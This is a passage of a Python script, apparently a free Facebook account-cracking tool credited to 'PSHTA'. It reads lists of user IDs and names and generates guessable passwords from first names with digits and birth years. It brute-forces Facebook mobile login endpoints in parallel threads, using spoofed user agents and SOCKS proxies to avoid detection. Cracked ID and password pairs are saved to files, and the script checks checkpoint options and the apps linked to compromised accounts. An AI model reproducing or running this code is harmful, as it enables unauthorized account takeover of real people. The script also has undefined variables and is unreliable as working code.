	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
for t in range(10000):
	a=random.choice([
									"4",
									"5",
									"6",
									"7",
									"8",
									"9",
									"10",
									"11",
									"12",
									"13",
									"9.1.5",
									"5.1.6",
									"4.0.1",
									"3.0.1",
									"4.0.2",
									"5.0.2",
									"6.0.1",
									"6.2.2",
									"7.0.1",
									"7.1.0",
									"8.1.0",
									"4.4.4",
									"5.6.1",
									"6.1.3"
									])
	b=random.choice([
									'en-us',
									'en-gb',
									'id-id',
									'de-de',
									'ru-ru',
									'en-sg',
									'fr-fr',
									'fa-ir',
									'ja-jp',
									'pt-br',
									'cs-cz',
									'zh-hk',
									'zh-cn',
									'vi-vn',
									'en-ph',
									'en-in',
									'tr-tr'
									])
	c=random.choice([
									"Redmi 7",
									"Redmi Note 8",
									"Redmi 6A",
									"Mi 9 Lite",
									"Redmi Note 11 Pro",
									"Redmi 5A",
									"Mi 9 SE",
									"POCO M4 Pro",
									"POCO X3 Pro",
									"Redmi 5 Plus",
									"Redmi Note 10 Pro",
									"M2007J22G",
									"Redmi 9C NFC"
									])
	d=random.choice([
									'OPM1',
									'TP1A',
									'RP1A',
									'PPR1',
									'PKQ1',
									'QP1A',
									'SP1A',
									'RKQ1'
									])
	e=random.choice([
									'001',
									'002',
									'003',
									'004',
									'005',
									'006',
									'007',
									'008',
									'009',
									'010',
									'011',
									'012',
									'013',
									'014',
									'015',
									'016',
									'017',
									'018',
									'019',
									'020'
									])
	f=random.randrange(111111,199999)
	g=random.randrange(10,300)
	h=random.randrange(1111,9999)
	i=random.randrange(20,100)
	j=random.choice([
									"XiaoMi/MiuiBrowser/13.23.2-gn",
									"XiaoMi/MiuiBrowser/13.13.2-gn",
									"XiaoMi/MiuiBrowser/13.16.1-gn",
									"XiaoMi/MiuiBrowser/13.25.2.1-gn",
									"XiaoMi/MiuiBrowser/12.15.3-go",
									"XiaoMi/MiuiBrowser/13.29.0-gn",
									"XiaoMi/MiuiBrowser/13.28.0-gn",
									"XiaoMi/MiuiBrowser/12.7.5-go",
									"XiaoMi/MiuiBrowser/13.28.0-gn",
									"XiaoMi/MiuiBrowser/12.22.0.3-gn"
									])
	kondom1=f'Mozilla/5.0 (Linux; U; Android {a}; {b}; {c} Build/{d}.{f}.{e}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	kondom2=f'Mozilla/5.0 (Linux; U; Android {a}; {b}; {c}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	uaku2 = random.choice([kondom1,kondom2])
	ugen.append(uaku2)

###

def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

###

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#----------[ Clour ]----------#

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m'
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])

#----------[ Data ]----------#

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
def masud(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()

#----------[ Logo ]----------#

def logo():
	clear()
	print("""   \033[1;31m

\033[1;97m


 _______    ______   ____  ____  _________     _       
|_   __ \ .' ____ \ |_   ||   _||  _   _  |   / \      
  | |__) || (___ \_|  | |__| |  |_/ | | \_|  / _ \     
  |  ___/  _.____`.   |  __  |      | |     / ___ \    
 _| |_    | \____) | _| |  | |_    _| |_  _/ /   \ \_  
|_____|    \______.'|____||____|  |_____||____| |____| 
                                                       

\033[1;92m
                                                              
[+] OWNER   : PSHTA
[+] Telegram : pshta12
[+] Github   : pshta01
[+] Version  : 1.1
[+] Tool     : Free ViP


\033[1;91m
\033[1;97m
\033[1;97m
\033[1;92m
\033[1;92m
                                 
              
\033[1;37m-------------------------------
""")

#----------[ Menu ]----------#

def menu():
	os.system('clear')
	logo()
	try:
		print('')
		jum = input('\033[1;37m File Dane :\033[1;92m ')
		print('')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		setting()
	except requests.exceptions.ConnectionError:
			exit()
	except (KeyError,IOError):
			time.sleep(3)
			follower()

#----------[ Setting ]----------#

def setting():
     rr = random.randint
     for ran in id:
            c_id = rr(0,len(id2))
            id2.insert(c_id, ran)
     setting2()
     
def setting2():
         print()
         if ['cukur']:
             os.system('cukur')
             method.append('crack')  
         else:method.append('crack')  
         otomatis()

#----------[ Password System ]----------#

def otomatis():
	os.system('clear')
	logo()
	print('')
	with tred(max_workers=50) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'1122')
					pwv.append(frs+'1212')
					pwv.append(frs+'123321')
					pwv.append(frs+'1221')
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
					pwv.append(frs+'2004')
					pwv.append(frs+'2005')
					pwv.append(frs+'2006')
					pwv.append(frs+'2007')
			else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'1122')
					pwv.append(frs+'1212')
					pwv.append(frs+'123321')
					pwv.append(frs+'1221')
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
					pwv.append(frs+'2004')
					pwv.append(frs+'2005')
					pwv.append(frs+'2006')
					pwv.append(frs+'2007')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	print(' \033[1;92mOK : %s '%(ok))
	print('')
	exit()

#----------[ Cracking ]----------#

def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r \033[1;37mpshta/\033[1;90m{loop}\033[1;37m/\033[1;95m{len(id)}\033[1;37m/\033[1;92m{ok} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ua3 = random.choice(ugen3)
	ua4 = random.choice(ugen4)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'p.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,'Accept-Language': 'en-US,en;q=0.5','Referer': 'https://www.facebook.com/?stype=lo&flo=1&deoia=1&jlou=Afe1ytH10sIE3aifD3P1Rga57ITBnraRNHbGLEcVVzggt13pVtgRUFeWQntXU4jZnKUuSMxC-j8m1Vf1DIgahpKrN3hEJDQ9KDXWgotl_FWljQ&smuh=32837&lh=Ac_bj52HUrlOOPXkXdc','Content-Type': 'multipart/form-data; boundary=---------------------------395234118417886647674052979797','Origin': 'https://www.facebook.com','Connection': 'keep-alive','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin',})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'touch.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://touch.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://touch.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				
				print(f'\r\033[1;92m[pshta-OK] {idf}|{pw}')
				open('/sdcard/CUKUR-OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r \033[1;37mpshta = {loop}\033[1;90m-\033[1;37m{len(id)} \033[1;92mOK\033[1;90m-\033[1;93mCP\033[1;90m = \033[1;92m{ok}\033[1;90m-\033[1;93m{cp}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1',  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0','Accept': '*/*','Accept-Language': 'en-US,en;q=0.5','Referer': 'https://www.facebook.com/?stype=lo&flo=1&deoia=1&jlou=Afe1ytH10sIE3aifD3P1Rga57ITBnraRNHbGLEcVVzggt13pVtgRUFeWQntXU4jZnKUuSMxC-j8m1Vf1DIgahpKrN3hEJDQ9KDXWgotl_FWljQ&smuh=32837&lh=Ac_bj52HUrlOOPXkXdc','Content-Type': 'multipart/form-data; boundary=---------------------------395234118417886647674052979797','Origin': 'https://www.facebook.com','Connection': 'keep-alive','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin',})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1), 'uid': idf, 'flow': 'login_no_pin', 'pass': pw, 'next': 'https://developers.facebook.com/tools/debug/accesstoken/'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r  \033[1;93m{idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r  \033[1;92m{idf} | {pw}')
				open('/sdcard/pshta-OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s[VAMPIRE]%s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s[VAMPIRE]---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s[VAMPIRE]---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s[VAMPIRE]%s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s[VAMPIRE]%s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s[pshta]%s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s[VAMPIRE]--> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s[VAMPIRE]%s%s'%(kk,opsii.text,x))
				except:
					print('\r%s[VAMPIRE]%s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s[VAMPIRE]%s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s[VAMPIRE]%s|%s ----> ID       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# '
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir(' Ok ')
	except:pass
	try:os.system(' Tiger-Prox.txt ')
	except:pass
	try:os.system(' Tiger-Prox.txt ')
	except:pass
	menu()
